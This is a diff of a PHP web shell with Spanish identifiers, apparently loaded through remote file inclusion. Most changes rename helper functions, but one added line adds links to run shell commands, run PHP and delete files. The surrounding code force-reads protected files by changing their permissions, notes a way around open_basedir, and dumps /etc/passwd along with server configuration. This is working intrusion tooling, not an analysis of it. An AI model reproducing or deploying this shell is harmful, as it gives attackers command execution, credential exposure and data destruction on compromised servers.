+        $celdaeditar = '<td class="ac"><a href="'.$rfiurl.'w=copiar&origen='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=copiar" class="ai" alt="Copiar"></a> <a href="'.$rfiurl.'w=comprimir&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=comprimir" class="ai" alt="Comprimir"></a> <a href="'.$rfiurl.'w=shell&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=comandos" class="ai" alt="Ejecutar comandos"></a> <a href="'.$rfiurl.'w=php&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=php" class="ai" alt="Ejecutar PHP"></a> <a href="'.$rfiurl.'w=eliminar&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'"><img src="'.$rfiurl.'w=img&imagen=eliminar" class="ai" alt="Eliminar"></a></td>';
         $salida = '<img src="'.$rfiurl.'w=img&imagen=carpeta" class="ai" alt="Carpeta"> <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').$barra.htmlentities($archivo,ENT_QUOTES,'UTF-8').'">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</a>';
         
     }else{      //Archivos
@@ -1539,7 +1558,7 @@ global $rfiurl;
     }
     
 
-    $filesize = formatBytes(filesize($ruta.$barra.$archivo));
+    $filesize = format_bytes(filesize($ruta.$barra.$archivo));
     
     if (!$eslink){      //cuando son links no se pone esto
         $perm = permisos($ruta.$barra.$archivo);
@@ -1606,7 +1625,7 @@ function permisos($archivo){
 }
 
 //formatea el tamaño de los archivos
-function formatBytes($b,$p = null) {
+function format_bytes($b,$p = null) {
     /**
      *
      * @author Martin Sweeny
@@ -1635,7 +1654,7 @@ function formatBytes($b,$p = null) {
 }
 
 //devuelve el contenido de un archivo
-function leerarchivo($ruta){
+function leer_archivo($ruta){
     if ((!$ruta) or is_dir($ruta)){return FALSE;}
     if (!is_readable($ruta)){
         $permisosviejos = substr(sprintf('%o', fileperms($ruta)), -4);
@@ -1690,7 +1709,7 @@ function leer_archivo_file($ruta){
 }
 
 //escribe en un archivo
-function escribirarchivo($ruta,$contenido) {
+function escribir_archivo($ruta,$contenido) {
     if (!$ruta){return FALSE;}
     if (!is_readable($ruta)){
         $permisosviejos = substr(sprintf('%o', fileperms($ruta)), -4);
@@ -1709,7 +1728,7 @@ function escribirarchivo($ruta,$contenido) {
 
 //devuelve el espacio libre/ocupado en el disco de forma entendible
 //rostvertol dot mil at gmail dot com
-function decodeSize( $bytes )
+function decode_size( $bytes )
 {
     $types = array( 'B', 'KiB', 'MiB', 'GiB', 'TiB' );
     for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
@@ -1746,18 +1765,18 @@ function copiar_recursivo($origen,$destino) {
     return $salida;
 } 
 function copiar_archivo($origen, $destino){
-    return copy($origen,$destino) or ((($archivo=leerarchivo($rutaOrigen))!==false) and (escribirarchivo($rutaDestino,$archivo)!==false)) or shell("cp ".escapeshellarg($origen).' '.escapeshellarg($destino), FALSE);
+    return copy($origen,$destino) or ((($archivo=leer_archivo($rutaOrigen))!==false) and (escribir_archivo($rutaDestino,$archivo)!==false)) or shell("cp ".escapeshellarg($origen).' '.escapeshellarg($destino), FALSE);
 }
 
 //muestra el contenido de un archivo en un textbox
-function mostrararchivo($ruta,$loc = true){
+function mostrar_archivo($ruta,$loc = true){
     static $leidos;
     //Si hay alguna funcion especial que bypassee el open_basedir tiene que ir acá
     $ruta = realpath($ruta);
     if (filesize($ruta)<50000){
         if(strpos($leidos,"\n".$ruta."\n")==false){
             $leidos.= "\n".$ruta."\n";
-            $contenido = htmlentities(leerarchivo(ltrim($ruta)), ENT_QUOTES, 'UTF-8');
+            $contenido = htmlentities(leer_archivo(ltrim($ruta)), ENT_QUOTES, 'UTF-8');
             if ($contenido){
                 $lineas = substr_count($contenido,"\n");
                 if ($lineas>15){ $lineas = 15; }
@@ -1769,7 +1788,7 @@ function mostrararchivo($ruta,$loc = true){
                 $locate = explode("\n",$locate);
                 if($locate){
                     foreach($locate as $ubicacion){
-                        mostrararchivo($ubicacion,false);
+                        mostrar_archivo($ubicacion,false);
                     }
                 }
             }
@@ -1803,7 +1822,7 @@ function mostrar_informacion(){
     } 
     
     $salida = '<b>'.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'</b><br><br>
-    <b>'.htmlentities(decodeSize(disk_free_space($ruta)), ENT_QUOTES, 'UTF-8').'</b> / <b>'.htmlentities(decodeSize(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'</b><br><br>
+    <b>'.htmlentities(decode_size(disk_free_space($ruta)), ENT_QUOTES, 'UTF-8').'</b> / <b>'.htmlentities(decode_size(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'</b><br><br>
     <b>PHP:</b> '.htmlentities(phpversion(), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>Zend:</b> '.htmlentities(zend_version(), ENT_QUOTES, 'UTF-8').'<br><br>
     <b>Safe_mode:</b> '.$safemode.'<br><br>
@@ -1820,7 +1839,7 @@ function mostrar_informacion(){
         <br>
         ';
     }
-    if($usuarios = leerarchivo('/etc/passwd')){
+    if($usuarios = leer_archivo('/etc/passwd')){
         $salida.= '<b>/etc/passwd:</b><br>
             <textarea style="width:100%;" rows="10">'.$usuarios.'</textarea><br><br>';
     }
